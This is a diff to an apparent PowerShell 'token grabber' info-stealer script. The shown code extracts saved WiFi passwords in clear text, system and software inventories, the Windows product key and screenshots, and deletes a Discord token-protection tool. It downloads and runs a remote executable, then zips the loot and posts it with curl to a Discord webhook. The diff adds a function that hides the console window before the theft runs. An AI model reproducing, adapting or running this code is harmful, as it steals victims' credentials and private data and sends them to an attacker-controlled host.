@@ -28,32 +28,24 @@ function EXFILTRATE-DATA {
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
     
-    # Extraction of WiFi Passwords
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
     
-    # Startup Apps
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
     
-    # Running Services
     Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
     
-    # Running Applications
     Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
     
-    # Installed Applicatons
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
     
-    # Network Adapters
     Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
 
-    # Get Windows Product Key
     
     $ProductKey
     Get-ProductKey > $env:localappdata\temp\ProductKey.txt
-    
-    # Screenshot    
+
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -120,12 +112,6 @@ function EXFILTRATE-DATA {
 
     Set-Location $env:LOCALAPPDATA\Temp
 
-    taskkill.exe /f /im "Discord.exe" | Out-Null
-    taskkill.exe /f /im "DiscordCanary.exe" | Out-Null
-    taskkill.exe /f /im "DiscordPTB.exe" | Out-Null
-    taskkill.exe /f /im "DiscordTokenProtector.exe" | Out-Null
-
-
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
@@ -141,7 +127,6 @@ function EXFILTRATE-DATA {
         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
     }
     
-    # Faster Download Speed
     $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
@@ -168,10 +153,7 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
-
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
-    #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$extracted\KDOT.zip" -ContentType "multipart/form-data"
-    #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$extracted\KDOT.zip" $webhook
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
     Remove-Item "$extracted\KDOT" -Recurse
@@ -239,9 +221,24 @@ function Request-Admin {
     }
 }
 
+function Hide-Console
+{
+    if (-not ("Console.Window" -as [type])) { 
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        '
+    }
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    $null = [Console.Window]::ShowWindow($consolePtr, 0)
+}
+
+
 if (CHECK_IF_ADMIN -eq $true) {
+    Hide-Console
     TASKS
-    #pause
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Request-Admin
